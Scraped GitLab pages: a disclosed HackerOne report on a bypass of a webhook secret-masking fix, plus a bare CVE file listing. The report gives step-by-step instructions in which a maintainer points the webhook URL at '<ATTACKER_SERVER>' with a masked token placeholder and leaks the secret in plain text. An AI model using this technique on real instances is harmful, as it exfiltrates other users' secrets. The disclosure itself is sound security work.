=== Content from gitlab.com_38369f5c_20250114_185118.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Maintainer can leak masked webhook secrets by adding a new parameter to the webhook URL to bypass the newly added validation logic

# âš  Please read [the process](https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md) on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.

**[HackerOne report #1871136](https://hackerone.com/reports/1871136)** by `0xn3va` on 2023-02-12, assigned to [@rshambhuni](/rshambhuni "Rohit Shambhuni"):

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

##### Summary

There is a vulnerability [#385118 (closed)](https://gitlab.com/gitlab-org/gitlab/-/issues/385118 "Maintainer can leak masked webhook secrets by changing target URL of the webhook") that was fixed and disclosed recently. The fix adds an extra check in case the URL changes:

```
###  https://gitlab.com/gitlab-org/gitlab/-/commit/7f34991ae36f1804610ba9980e31191394c8b208

###  ...

  before_validation :reset_url_variables, unless: ->(hook) { hook.is_a?(ServiceHook) }

###  ...

  def reset_url_variables
    self.url_variables = {} if url_changed? && !encrypted_url_variables_changed?
  end

```

However, `reset_url_variables` will return `false` if the URL variables have also been changed. This allows bypassing the check by adding a new variable to the modified URL.

##### Steps to reproduce

As a project owner

1. Create a project
2. Add another user to the project as a maintainer
3. Go to Settings > Webhooks
4. Put the URL `https://example.com?token=secret-token`
5. Click to add a mask
6. Add the value `secret-token` with the replacement `TOKEN`
7. Click save for the webhook

As a maintaner

1. Open the project
2. Go to Settings > Webhooks
3. Click edit on the webhook
4. Edit the URL to your controlled server like that: `https://<ATTACKER_SERVER>?token={TOKEN}&a=aaaaa`
5. Add the value `aaaaa` with the replacement `A`
6. Save the webhook
7. Now click `Test` to send a request
8. Check your server logs; it will contain the secret in plain text

##### Impact

This vulnerability allows an attacker with the Maintainer role to leak webhook secrets.

##### What is the current *bug* behavior?

Adding or deleting a new secret does not reset the previously saved ones

##### What is the expected *correct* behavior?

Adding or deleting a new secret resets the previously saved ones

##### Relevant logs and/or screenshots

[Screen\_Recording\_2023-02-12\_at\_12.55.50.mov](https://user-content.gitlab-static.net/23b5c784f1dfc71a13b65416a8fd68cd07772792/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f38393630396561652d633036642d343564652d393465622d6339653932613831326332362f53637265656e5f5265636f7264696e675f323032332d30322d31325f61745f31322e35352e35302e6d6f76 "Download 'Screen_Recording_2023-02-12_at_12.55.50.mov'")

##### Output of checks

This bug happens on GitLab.com

#### Impact

This vulnerability allows an attacker with the Maintainer role to leak webhook secrets.

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [Screen\_Recording\_2023-02-12\_at\_12.55.50.mov](https://h1.sec.gitlab.net/a/89609eae-c06d-45de-94eb-c9e92a812c26/Screen_Recording_2023-02-12_at_12.55.50.mov)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.



=== Content from gitlab.com_8ab41197_20250114_185117.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

* [cves](/gitlab-org/cves/-/tree/master)
* [2023](/gitlab-org/cves/-/tree/master/2023)
* [**CVE-2023-0838.json**](/gitlab-org/cves/-/blob/master/2023/CVE-2023-0838.json)

Find file

[Blame](/gitlab-org/cves/-/blame/master/2023/CVE-2023-0838.json)
[Permalink](/gitlab-org/cves/-/blob/5dbfc725a86e6d942deec9c36b7f06f5b8d912fc/2023/CVE-2023-0838.json "Go to permalink <kbd class='flat ml-1' aria-hidden=true>y</kbd>")

* [![ðŸ¤– GitLab Bot ðŸ¤–'s avatar](/uploads/-/system/user/avatar/1786152/avatar.png?width=64 "ðŸ¤– GitLab Bot ðŸ¤–")](/gitlab-bot)

  Mar 31, 2023

  [8d18172f](/gitlab-org/cves/-/commit/8d18172ffea7124ae2e70a8047ca676f0e4df091)
  [Publishing 0 updated advisories and 14 new advisories](/gitlab-org/cves/-/commit/8d18172ffea7124ae2e70a8047ca676f0e4df091)
  Â·
  8d18172f

  [ðŸ¤– GitLab Bot ðŸ¤–](/gitlab-bot) authored Mar 31, 2023

  8d18172f

  [Publishing 0 updated advisories and 14 new advisories](/gitlab-org/cves/-/commit/8d18172ffea7124ae2e70a8047ca676f0e4df091)
  [ðŸ¤– GitLab Bot ðŸ¤–](/gitlab-bot) authored Mar 31, 2023

Loading


